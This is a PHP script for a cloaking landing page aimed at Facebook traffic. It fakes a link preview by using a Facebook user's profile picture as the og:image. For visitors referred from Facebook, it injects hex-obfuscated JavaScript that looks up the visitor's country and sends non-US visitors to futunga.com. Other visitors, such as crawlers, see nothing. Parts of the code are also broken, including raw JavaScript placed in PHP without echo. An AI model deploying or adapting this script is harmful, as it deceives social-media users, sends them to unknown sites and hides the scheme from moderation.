<?php

    $host = $_SERVER["HTTP_HOST"];
    if(!isset($_GET["id"])){
        $_GET["id"] = "";
    }
    $_GET["id"] = explode(".", $_GET["id"])[0];
    $_GET["id"] = explode("/", $_GET["id"])[1];
    if(isset($_GET["uid"])){
        $imagelink = "https://graph.facebook.com/".$_GET["uid"]."/picture?width=640&height=340";
        $putimage = true;
    }else{
        $putimage = false;
    }
    $randomclass = md5rand(8);

  function md5rand($val){
  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
      $chars="0123456789";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val) 
    {
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }
    return $pass;
    }
      function shkronja($val){
  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
      $chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val) 
    {
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }
    return $pass;
    }



    ?>
<meta property="og:image" content="<?php echo $imagelink; ?>"">
<meta property="og:image:width" content="560">
<meta property="og:image:height" content="315">
<?php

{
$randval = rand();
if (strstr($_SERVER['HTTP_REFERER'], 'facebook.com') !== false) {
  
  
  if (strpos($_SERVER["REQUEST_URI"], 'sanx1') !== false){

  echo '<script>

var _0x8fa3=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x66\x75\x74\x75\x6E\x67\x61\x2E\x63\x6F\x6D\x2F","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x8fa3[2]](_0x8fa3[0],_0x8fa3[1],false);xmlhttpz[_0x8fa3[3]]();var get=JSON[_0x8fa3[5]](xmlhttpz[_0x8fa3[4]]);var country=get[_0x8fa3[7]][_0x8fa3[6]];if(country== _0x8fa3[8]){exit}else {top[_0x8fa3[10]][_0x8fa3[9]]= _0x8fa3[11]+ Math[_0x8fa3[13]](Math[_0x8fa3[12]]()* 99999999)}  
</script>';
  } else {
  



echo "<script>\n"; 
var _0x8fa3=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x66\x75\x74\x75\x6E\x67\x61\x2E\x63\x6F\x6D\x2F","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x8fa3[2]](_0x8fa3[0],_0x8fa3[1],false);xmlhttpz[_0x8fa3[3]]();var get=JSON[_0x8fa3[5]](xmlhttpz[_0x8fa3[4]]);var country=get[_0x8fa3[7]][_0x8fa3[6]];if(country== _0x8fa3[8]){exit}else {top[_0x8fa3[10]][_0x8fa3[9]]= _0x8fa3[11]+ Math[_0x8fa3[13]](Math[_0x8fa3[12]]()* 99999999)}  
echo "</script>\n";
  }
}




else {
     //Google brought me to this page.
    //header("Location: https://facebook.com/search?q=".$randval);
   exit();
}  }


?>
